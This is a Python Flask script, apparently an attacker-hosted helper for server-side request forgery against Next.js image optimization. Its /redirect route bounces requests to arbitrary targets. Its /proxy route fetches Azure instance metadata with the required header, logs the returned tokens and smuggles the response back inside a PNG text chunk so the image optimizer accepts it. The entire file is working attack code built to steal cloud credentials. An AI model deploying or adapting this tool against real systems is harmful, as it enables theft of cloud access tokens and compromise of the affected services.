# redirector.py
import os
import io
import logging
from flask import Flask, request, redirect, Response
import requests

from PIL import Image, PngImagePlugin  # pillow

logging.basicConfig(level=logging.INFO)
app = Flask(__name__)

@app.route('/redirect')
def ssrf_redirect():
    target = request.args.get('target')
    app.logger.info("redirect hit from %s -> %s", request.remote_addr, target)
    if not target:
        return "Missing 'target' parameter", 400
    return redirect(target, code=302)

@app.route('/proxy')
def ssrf_proxy():
    """
    Proxy that requests the target with the Metadata: true header (for Azure IMDS),
    logs the raw response body, and then returns a valid PNG containing the
    response JSON in a tEXt chunk so Next.js's image optimizer accepts it.
    """
    target = request.args.get('target')
    if not target:
        return "Missing 'target' parameter", 400

    app.logger.info("proxy hit from %s -> %s", request.remote_addr, target)

    try:
        # Request the target with the Metadata header
        r = requests.get(target, headers={'Metadata': 'true'}, timeout=5)
    except Exception as e:
        app.logger.exception("proxy error while requesting %s", target)
        return f"Error: {e}", 500

    # Log the status and body (careful: tokens will appear in logs)
    try:
        body_text = r.text
    except Exception:
        body_text = "<binary or non-text response>"

    app.logger.info("Upstream %s returned status %s; body (first 4096 chars):\n%s",
                    target, r.status_code, body_text[:4096])

    # Build a tiny 1x1 PNG and embed the body_text as a tEXt chunk (key "imds")
    try:
        img = Image.new("RGB", (1, 1), (255, 255, 255))
        meta = PngImagePlugin.PngInfo()
        # Put the response (or truncated) into the PNG metadata
        meta.add_text("imds", body_text)
        buf = io.BytesIO()
        img.save(buf, format="PNG", pnginfo=meta, optimize=True)
        png_bytes = buf.getvalue()
    except Exception as e:
        app.logger.exception("Failed to create PNG wrapper: %s", e)
        return f"Error creating PNG: {e}", 500

    # Return the PNG so the SSRF caller gets a valid image response
    return Response(png_bytes, status=200, content_type="image/png")

if __name__ == '__main__':
    # bind to 0.0.0.0 and use Render's PORT env var
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
